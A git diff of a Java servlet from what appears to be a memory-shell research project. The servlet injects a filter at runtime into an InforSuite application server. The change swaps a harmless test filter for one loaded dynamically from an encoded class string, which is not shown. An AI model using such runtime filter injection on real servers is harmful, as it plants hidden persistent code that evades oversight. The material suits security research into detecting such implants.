@@ -4,10 +4,12 @@ import com.cvicse.loong.enterprise.web.WebModule;
 import org.apache.catalina.deploy.FilterDef;
 import org.apache.catalina.deploy.FilterMap;
 
-import javax.servlet.*;
+import javax.servlet.DispatcherType;
+import javax.servlet.Filter;
+import javax.servlet.ServletContext;
+import javax.servlet.ServletException;
 import javax.servlet.http.HttpServlet;
 import javax.servlet.http.HttpServletRequest;
-import javax.servlet.http.HttpServletRequestWrapper;
 import javax.servlet.http.HttpServletResponse;
 import java.io.IOException;
 import java.lang.reflect.Constructor;
@@ -15,6 +17,8 @@ import java.lang.reflect.Field;
 import java.util.HashMap;
 import java.util.HashSet;
 import java.util.List;
+
+import static org.su18.memshell.test.inforsuite.DynamicUtils.FILTER_CLASS_STRING;
 
 /**
  * 真垃圾，mac 上部署个项目都部不起来，浪费我好多时间
@@ -50,7 +54,7 @@ public class AddInforSuiteFilter extends HttpServlet {
 			}
 
 			// 创建自定义 Filter 对象
-			Filter filter = new AddInforSuiteFilter.TestFilter();
+			Filter filter = (Filter) DynamicUtils.getClass(FILTER_CLASS_STRING).newInstance();
 
 			// 创建 FilterDef 对象
 			FilterDef filterDef = new FilterDef();
@@ -91,62 +95,5 @@ public class AddInforSuiteFilter extends HttpServlet {
 			e.printStackTrace();
 		}
 
-	}
-
-	public static class TestFilter implements Filter {
-
-		/**
-		 * 初始化 filter
-		 *
-		 * @param filterConfig FilterConfig
-		 */
-		@Override
-		public void init(FilterConfig filterConfig) {
-		}
-
-		/**
-		 * doFilter 方法处理过滤器逻辑
-		 *
-		 * @param servletRequest  ServletRequest
-		 * @param servletResponse ServletResponse
-		 * @param filterChain     FilterChain
-		 * @throws IOException      抛出异常
-		 * @throws ServletException 抛出异常
-		 */
-		@Override
-		public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
-			// 给下一个过滤器
-			filterChain.doFilter(new AddInforSuiteFilter.TestFilter.FilterRequest((HttpServletRequest) servletRequest), servletResponse);
-		}
-
-		/**
-		 * 销毁时执行的方法
-		 */
-		@Override
-		public void destroy() {
-		}
-
-		/**
-		 * 自定义 FilterRequest 重写 getParameter 方法处理 id 值
-		 */
-		class FilterRequest extends HttpServletRequestWrapper {
-
-			public FilterRequest(HttpServletRequest request) {
-				super(request);
-			}
-
-			@Override
-			public String getParameter(String name) {
-				if ("id".equals(name)) {
-					String originalId = super.getParameter(name);
-
-					if (originalId != null && !originalId.isEmpty()) {
-						int idNum = (Integer.parseInt(originalId) * 99);
-						return Integer.toString(idNum);
-					}
-				}
-				return super.getParameter(name);
-			}
-		}
 	}
 }
